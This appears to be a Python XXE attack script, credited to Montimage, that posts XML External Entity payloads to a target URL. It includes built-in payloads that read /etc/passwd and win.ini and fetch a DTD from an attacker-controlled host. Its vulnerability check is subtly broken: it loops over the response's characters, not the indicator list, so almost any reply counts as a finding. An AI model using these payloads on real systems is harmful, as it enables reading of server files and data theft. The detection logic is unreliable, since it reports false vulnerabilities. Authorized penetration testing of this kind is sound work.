#!/usr/bin/env python3
"""
XML External Entity (XXE) Attack Simulation

Tests web applications for XXE vulnerabilities by injecting malicious XML entities.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os, sys, argparse
from typing import Dict, Any, List

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

try:
    import requests
except ImportError:
    logger.error("Requires requests: pip install requests")
    sys.exit(1)


# Common XXE payloads
DEFAULT_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><data>&xxe;</data>',
]


class XXEAttack:
    """XXE attack simulator."""

    def __init__(self, url: str, payloads: List[str], verbose: bool = False):
        self.url = url
        self.payloads = payloads
        self.verbose = verbose
        self.attempts = 0
        self.found_vulnerabilities = []
        logger.info(f"Initialized XXE testing on {url}")

    def test_payload(self, payload: str) -> bool:
        """Test a single XXE payload."""
        try:
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(self.url, data=payload, headers=headers, timeout=10)
            self.attempts += 1

            # Check for file content indicators
            indicators = ["root:", "[extensions]", "<?php"]
            for indicator in response.text:
                if indicator in response.text:
                    logger.warning(f"Potential XXE vulnerability found")
                    self.found_vulnerabilities.append(payload)
                    return True

            if self.verbose:
                logger.debug(f"Payload unsuccessful")
            return False
        except Exception as e:
            if self.verbose:
                logger.debug(f"Error: {e}")
            return False

    def execute(self) -> Dict[str, Any]:
        """Execute the XXE testing."""
        logger.info(f"Starting XXE testing with {len(self.payloads)} payloads")

        try:
            for i, payload in enumerate(self.payloads, 1):
                logger.info(f"Testing payload {i}/{len(self.payloads)}")
                self.test_payload(payload)

            if self.found_vulnerabilities:
                logger.warning(f"Found {len(self.found_vulnerabilities)} potential vulnerabilities")
            else:
                logger.info("No XXE vulnerabilities detected")

        except KeyboardInterrupt:
            logger.warning("Interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            stats = {"attempts": self.attempts, "vulnerabilities_found": len(self.found_vulnerabilities)}
            return stats


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="XXE Attack Simulation")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--payloads", help="Custom payloads file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    return parser.parse_args()


def main():
    print("=" * 80)
    print("WARNING: For AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    try:
        args = parse_arguments()
        if args.payloads:
            with open(args.payloads, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
        else:
            payloads = DEFAULT_PAYLOADS

        attack = XXEAttack(args.url, payloads, args.verbose)
        attack.execute()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
